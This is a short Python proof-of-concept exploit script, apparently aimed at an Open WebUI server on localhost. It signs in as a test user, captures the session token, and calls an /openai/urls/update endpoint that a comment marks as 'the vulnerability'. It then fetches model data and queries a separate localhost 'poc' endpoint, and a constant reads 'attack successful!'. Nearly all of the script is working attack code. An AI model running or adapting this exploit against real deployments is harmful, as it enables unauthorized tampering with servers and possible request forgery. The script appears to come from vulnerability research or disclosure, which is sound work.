# from flask import jsonify
import requests
import json

RESPONSE_BODY = {"success": True, "message": "attack successful!"}

WEBUI_API_BASE_URL = "http://localhost:8080/api/v1"

def user_sign_in(email: str, password: str):
    error = None
    url = f"{WEBUI_API_BASE_URL}/auths/signin"

    try:
        response = requests.post(
            url,
            headers={"Content-Type": "application/json"},
            data=json.dumps({"email": email, "password": password}),
        )
        if response.status_code != 200:
            raise response.json()
        
        # Extract response JSON and token from cookies
        res = response.json()
        token = response.cookies.get('token')  # Adjust 'token' if your server uses a different key
        if not token:
            raise Exception("Token not found in cookies.")

        res['token'] = token  # Add token to the response for convenience

    except Exception as err:
        print(err)
        error = getattr(err, "detail", str(err))
        res = None

    if error:
        raise Exception(error)

    return res


# Perform user sign-in and retrieve token
try:
    user_info = user_sign_in("test@test.com", "test")
    token = user_info['token']
except Exception as e:
    print(f"Sign in failed: {str(e)}")
    exit(1)

# Use the token in subsequent requests
cookies = {
    'token': token,  # Use the token retrieved from the sign-in response
}

headers = {
    'Content-Type': 'application/json',
    'Accept': 'application/json',
}

json_data = {
    "urls": [""]
}

# ========================
# The vulnerability is making a POST request to update URLs
response = requests.post('http://localhost:8080/openai/urls/update', cookies=cookies, headers=headers, json=json_data)
print("Update URLs Response:")
print(response.text)

response = requests.get('http://localhost:8080/openai/models/0', cookies=cookies, headers=headers)
print("Model Data Response:")
print(response.text)

r = requests.request(method="GET", url="http://localhost:8888/poc?/models", headers=headers, cookies=cookies)
r.raise_for_status()
print(r.text)